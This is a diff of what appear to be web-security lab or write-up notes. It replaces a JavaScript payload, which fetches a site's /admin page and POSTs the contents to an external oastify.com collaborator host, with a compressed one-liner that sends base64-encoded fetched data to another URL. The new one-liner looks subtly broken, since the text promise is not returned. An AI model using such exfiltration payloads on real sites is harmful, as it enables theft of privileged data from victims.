@@ -55,18 +55,7 @@ __Endpoints__
 - /admin - 403
 
 ```javascript
-fetch('/admin')
-  .then(function(response) {
-    return response.text();
-  })
-  .then(function(data) {
-    fetch('https://t0uxr3i4vnt66ewlzppa5t6xhonlba.oastify.com/send', {
-      method: 'POST',
-      body: JSON.stringify(data),
-      headers: {
-        'Content-Type': 'application/json'
-      }
-    })
+fetch(id).then(function(r){r.text()}).then(function(data){fetch(name+btoa(data))})
 ```
 
 ---
